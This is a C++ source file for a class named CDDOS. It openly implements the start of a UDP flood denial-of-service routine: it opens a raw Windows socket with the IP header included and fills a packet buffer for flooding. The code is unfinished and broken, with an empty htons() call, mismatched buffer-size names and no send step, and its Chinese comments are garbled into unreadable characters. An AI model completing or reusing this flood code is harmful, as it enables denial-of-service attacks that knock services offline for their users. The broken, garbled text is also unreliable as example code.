// DDOS.cpp: implementation of the CDDOS class.
//
//////////////////////////////////////////////////////////////////////

#include "DDOS.h"
#include <iostream.h>
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CDDOS::CDDOS()		//���캯��
{

}
void CDDOS::fill_udp_buffer()
{
	WSADATA wsaData;
	//��ʼ��socket.dll
	WSAStartup(MAKEWORD(2, 2),&wsaData);
	unsigned int saddr = 0;
	char hostname[MAX_PATH];			//������
	gethostname(hostname,MAX_PATH);			//���������
	LPHOSTENT lphost;

	//ͨ�������������������ϸ��Ϣ
	lphost = gethostbyname(hostname);
	if (lphost != NULL)
	{

		saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;


	}
	char pBuffer[BufferSize];		//����һ��1024�ֽڵĻ�����
	IP_HEADER ipHeader;			//IPͷ
	UDP_HEADER udpHeader;		//UDPͷ
	int iUdpCheckSumSize;
	char *ptr = NULL;
	FillMemory(pBuffer,nBufferSize,'A');		//��pBuffer���ΪA
	iTotalSize = sizeof(ipHeader) + sizeof(udpHeader) + nBufferSize;
}
void CDDOS::udp_flood()
{
/************************************************************************/
/* UDP��ˮ����															*/
/************************************************************************/

	//��ͣ��ǰ���̣���ʱ����
	Sleep(2000);
	WSADATA wsaData;

	WSAStartup(MAKEWORD(2, 2),&wsaData);
	
	SOCKET SendSocket;
	BOOL Flag;
	//����һ����ָ�����ͷ���������׽��֣�����ʧ���򷵻�
	SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	if ( SendSocket == INVALID_SOCKET )
	{


		return;


	}
	Flag = true;
	//�����׽���ѡ��ֵ
	if (setsockopt(SendSocket,IPPROTO_UDP,IP_HDRINCL,(CHAR *)&Flag,sizeof(Flag))  == SOCKET_ERROR )
	{


		//�����׽���ѡ��ֵ�д�����
		cout<<"setsockopt Error!\n"<<endl;
		return;

	}
	SOCKADDR_IN addr_in;
	addr_in.sin_family = AF_INET;
	addr_in.sin_port = htons()

}


CDDOS::~CDDOS()		//��������
{

}
